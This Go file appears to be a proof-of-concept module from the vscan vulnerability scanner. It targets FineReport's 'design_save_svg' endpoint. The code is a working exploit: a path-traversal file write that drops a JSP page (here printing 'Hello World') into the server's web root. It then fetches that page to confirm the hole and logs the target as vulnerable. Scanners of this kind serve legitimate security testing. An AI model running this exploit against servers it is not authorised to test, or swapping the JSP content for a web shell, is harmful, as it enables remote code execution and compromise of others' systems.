package fineReport

import (
	"fmt"
	"github.com/veo/vscan/pkg"
)

//

func Design_save_svg(u string) bool {
	data := `{"__CONTENT__":"<%out.println(\"Hello World!\");%>","__CHARSET__":"UTF-8"}`
	if req, err := pkg.HttpRequset(u+"/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp", "POST", data, false, nil); err == nil {
		if req.StatusCode == 200 {
			if req2, err := pkg.HttpRequset(u+"/WebReport/update.jsp", "GET", "", false, nil); err == nil {
				if req2.StatusCode == 200 {
					pkg.GoPocLog(fmt.Sprintf("Found vuln fineReport Design_save_svg|%s\n", u+"/WebReport/update.jsp"))
					return true
				}
			}
		}
	}
	return false
}
